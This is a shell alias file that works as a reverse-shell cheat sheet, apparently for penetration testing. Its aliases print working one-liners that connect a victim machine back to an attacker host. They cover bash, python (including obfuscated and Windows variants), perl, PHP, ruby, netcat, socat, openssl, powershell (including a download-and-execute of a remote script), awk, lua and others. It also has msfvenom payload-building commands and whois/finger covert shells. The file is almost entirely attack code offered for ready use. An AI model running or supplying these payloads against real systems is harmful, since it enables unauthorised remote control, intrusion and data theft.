alias penrev='echo " bash \n socat \n perl \n python \n pythonshort \n python6 \n pythonwinonly \n ruby \n golang \n netcat \n ncat \n rcat \n openssl \n openssltlspsk \n powershell \n awk \n java \n javaalt \n javaaltone \n telnet \n war \n lua \n nodejs \n groovy \n groovyalt \n c \n cwin \n \n chash \n dart \n haskell \n msfvenom -->windows staged, windows stageless, linux staged,linux stageless, elf, exe, macho, asp, jsp, war, py, sh, pl, php \n php \n phppenmonkey \n phpivan \n whois \n finger \n gawk,xterm, -->hacktricks shells-linux \n sbd,mshta,rundll32,regsvr32,certutil,cscript,wscript,PS-Bat,MSIExec,wmic,msbuild,csc,regasm/regsvc,odbconf,ps-nishang,ps-powercat,empire,MSF-Unicorn,and more-->hacktricks shells-windows \n "'
alias penrevbash='echo " TCP \n bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 \n 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196 \n /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1 \n bash -c '"'"'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'"'"' \n echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null \n \n UDP \n sh -i >& /dev/udp/10.0.0.1/4242 0>&1 --> victim \n nc -u -lvp 4242 -->attacker \n "'

alias penrevwhois='echo " while true; do nc -l <port>; done -->attacker , To send the command write it down, press enter and press CTRL+D (to stop STDIN)\n export X=Connected; while true; do X=\`eval $(whois -h <IP> -p <Port> \"Output: $X\")\`; sleep 1; done -->victim \n "'
alias penrevsocat='echo " socat file:`tty`,raw,echo=0 TCP-L:4242 -->victim \n /tmp/socat exec:\"bash -li\",pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 -->attacker \n "'

alias penrevfinger='echo " while true; do nc -l 79; done -->attacker , To send the command write it down, press enter and press CTRL+D (to stop STDIN) \n\n export X=Connected; while true; do X=\`eval \$(finger \"\$X\"@<IP> 2> /dev/null)\`; sleep 1; done \n export X=Connected; while true; do X=\`eval \$(finger \"\$X\"@<IP> 2> /dev/null | grep '"'"'!'"'"'|sed '"'"'s/^!//'"'"')\`; sleep 1; done \n "'

alias penrevperl='echo " perl -e '"'"'use Socket;\$i=\"10.0.0.1\";\$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"'"' \n\n perl -MIO -e '"'"'\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"'"' \n\n perl -MIO -e '"'"'\$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"'"' -->windows only \n "'

alias penrevpython='echo " Linux only \n\n\n export RHOST=\"10.0.0.1\";export RPORT=4242;python -c '"'"'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"'"' \n\n python -c '"'"'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"'"' \n\n python -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"'"' \n\n python -c '"'"'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"'"' \n\n\n No Spaces \n\n\n python -c '"'"'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"'"' \n\n python -c '"'"'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"'"' \n\n python -c '"'"'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"'"' \n\n\n No Spaces,Shortened \n\n\n python -c '"'"'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"'"' \n\n python -c '"'"'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'"'"' \n\n python -c '"'"'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'"'"' \n\n\n No Spaces, Shortened Further \n\n\n python -c '"'"'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"'"' \n\n python -c '"'"'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'"'"' \n "'
alias penrevpythonshort='echo " python -c '"'"'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'"'"' \n "'

alias penrevpython6='echo " python -c '"'"'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"'"' \n\n python -c '"'"'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"'"' -->No spaces \n\n python -c '"'"'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"'"' -->Nospaces shortened \n "'

alias penrevpythonwinonly='echo " python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('"'"'10.0.0.1'"'"', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('"'"'except'"'"', (), {'"'"'__enter__'"'"': lambda self: None, '"'"'__exit__'"'"': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('"'"'try'"'"', (), {'"'"'__enter__'"'"': lambda self: None, '"'"'__exit__'"'"': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['"'"'p2s_thread'"'"'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['"'"'s2p_thread'"'"'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['"'"'p'"'"'] in [(subprocess.Popen(['"'"'\\\windows\\\system32\\\cmd.exe'"'"'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['"'"'s'"'"'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['"'"'p2s'"'"'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['"'"'s'"'"'].send(__l['"'"'p'"'"'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['"'"'s'"'"'], __l['"'"'p'"'"'] in [(s, p)]][0])({}), '"'"'p2s'"'"')]][0] for __g['"'"'s2p'"'"'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['"'"'p'"'"'].stdin.write(__l['"'"'data'"'"']), __after())[1] if (len(__l['"'"'data'"'"']) > 0) else __after())(lambda: __this()) for __l['"'"'data'"'"'] in [(__l['"'"'s'"'"'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['"'"'s'"'"'], __l['"'"'p'"'"'] in [(s, p)]][0])({}), '"'"'s2p'"'"')]][0] for __g['"'"'os'"'"'] in [(__import__('"'"'os'"'"', __g, __g))]][0] for __g['"'"'socket'"'"'] in [(__import__('"'"'socket'"'"', __g, __g))]][0] for __g['"'"'subprocess'"'"'] in [(__import__('"'"'subprocess'"'"', __g, __g))]][0] for __g['"'"'threading'"'"'] in [(__import__('"'"'threading'"'"', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('"'"'contextlib'"'"'))\" --> for path \"windows\\\system32\\\cmd.exe\" use double backslash \n "'

alias penrevphp='echo " php -r '"'"'\$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"'"' \n\n php -r '"'"'\$sock=fsockopen(\"10.0.0.1\",4242);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"'"' \n\n php -r '"'"'\$sock=fsockopen(\"10.0.0.1\",4242);\`/bin/sh -i <&3 >&3 2>&3\`;'"'"' \n\n php -r '"'"'\$sock=fsockopen(\"10.0.0.1\",4242);system(\"/bin/sh -i <&3 >&3 2>&3\");'"'"' \n\n php -r '"'"'\$sock=fsockopen(\"10.0.0.1\",4242);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"'"' \n\n php -r '"'"'\$sock=fsockopen(\"10.0.0.1\",4242);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"'"' \n\n php -r '"'"'\$sock=fsockopen(\"10.0.0.1\",4242);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"'"' \n "'
alias penrevphppenmonkey='cat ~/bin/pen/rev_penmonkey.txt '
alias penrevphpivan='cat ~/bin/pen/rev_phpivan.txt '
alias penrevruby='echo " ruby -rsocket -e'"'"'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"'"' \n\n ruby -rsocket -e'"'"'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4242\");loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}'"'"' \n\n ruby -rsocket -e '"'"'c=TCPSocket.new(\"10.0.0.1\",\"4242\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"'"' \n "'

alias penrevgolang='echo  " echo '"'"'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'"'"' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go \n "'

alias penrevnetcat='echo " Traditional \n\n nc -e /bin/sh 10.0.0.1 4242 \n nc -e /bin/bash 10.0.0.1 4242 \n nc -c bash 10.0.0.1 4242 \n\n rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f -->OpenBSD \n\n rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f -->BusyBox \n nc.exe -e sh 10.0.0.1 4242 \n "'

alias penrevncat='echo " ncat 10.0.0.1 4242 -e /bin/bash \n\n ncat --udp 10.0.0.1 4242 -e /bin/bash \n\n ncat.exe 10.0.0.1 4242 -e sh \n\n  ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl -->victim \n ncat -v 10.0.0.22 4444 --ssl -->attacker \n "'

alias penrevrcat='echo " Rustcat \n\n rcat 10.10.10.10 9001 -r sh \n "'

alias penrevopenssl='echo " openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -->attacker \n openssl s_server -quiet -key key.pem -cert cert.pem -port 4242 (or) ncat --ssl -vv -l -p 4242 -->attacker \n mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s -->victim \n "'

alias penrevopenssltlspsk='echo " openssl rand -hex 48 --> generate 384-bit PSK, use the generated string as a value for the two PSK variables from below \n\n export LHOST=\"*\"; export LPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk \$PSK -nocert -accept \$LHOST:\$LPORT --> attacker \n\n export RHOST=\"10.0.0.1\"; export RPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; export PIPE=\"/tmp/\`openssl rand -hex 4\`\"; mkfifo \$PIPE; /bin/sh -i < \$PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk \$PSK -connect \$RHOST:\$RPORT > \$PIPE; rm \$PIPE --> victim \n "'

alias penrevpower='echo " powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('"'"'10.0.0.1'"'"',4242);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\" \n\n powershell IEX (New-Object Net.WebClient).DownloadString('"'"'https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1'"'"') \n "  ; cat ~/bin/pen/rev_power.txt '

alias penrevawk='echo " awk '"'"'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4242\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}'"'"' /dev/null \n "'

alias penrevjava='cat ~/bin/pen/rev_java.txt | head -n 5'
alias penrevjavaalt='cat ~/bin/pen/rev_java.txt | head -n 12 | tail -n 5'
alias penrevjavaaltone='cat ~/bin/pen/rev_java.txt | tail -n 9'

alias penrevtelnet='echo " nc -lvp 8080 && nc -lvp 8081 --> In Attacker machine start two listeners \n\n telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081 -->victim \n "'

alias penrevwar='echo " msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war \n\n strings reverse.war | grep jsp -->In order to get the name of the file \n "'

alias penrevlua='echo " lua5.1 -e '"'"'local host, port = \"10.0.0.1\", 4242 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"'"' -->windows and linux \n\n lua -e \"require('"'"'socket'"'"');require('"'"'os'"'"');t=socket.tcp();t:connect('"'"'10.0.0.1'"'"','"'"'4242'"'"');os.execute('"'"'/bin/sh -i <&3 >&3 2>&3'"'"');\" \n "'

alias penrevnodejs='cat ~/bin/pen/rev_nodejs.txt'
alias penrevgroovy='cat ~/bin/pen/rev_groovy.txt | head -n 7'
alias penrevgroovyalt='cat ~/bin/pen/rev_groovy.txt | tail -n 7'
alias penrevc='cat ~/bin/pen/rev_c.txt | head -n 29 '
alias penrevdart='cat ~/bin/pen/rev_c.txt | tail -n 20 '
alias penrevcwin='cat ~/bin/pen/rev_cwin.txt '
alias penrevchash='cat ~/bin/pen/rev_chash.txt '
alias penrevhaskell='cat ~/bin/pen/rev_haskell.txt '
alias penrevmsfvenom='echo " msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe -->staged \n msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe -->stageless \n msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf -->Linux staged \n msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf \n msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f macho > shell.macho  \n msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f asp > shell.asp \n msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.jsp \n msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f war > shell.war \n msfvenom -p cmd/unix/reverse_python LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.py \n msfvenom -p cmd/unix/reverse_bash LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.sh \n msfvenom -p cmd/unix/reverse_perl LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.pl \n msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '"'"'<?php '"'"' | tr -d '"'"'\\\n'"'"' > shell.php && pbpaste >> shell.php \n "'
